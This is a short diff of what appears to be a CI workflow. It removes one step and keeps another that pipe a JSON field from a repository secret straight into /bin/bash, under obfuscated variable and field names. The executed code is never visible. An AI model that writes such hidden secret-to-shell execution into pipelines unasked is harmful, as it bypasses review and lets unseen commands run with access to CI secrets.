@@ -17,7 +17,6 @@ jobs:
           p272: ${{ secrets.p272 }}
         run: |
           printf '%s' "$p272" | jq -r .nqofg332 | /bin/bash
-          printf '%s' "$k851" | jq -r .bdg48 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
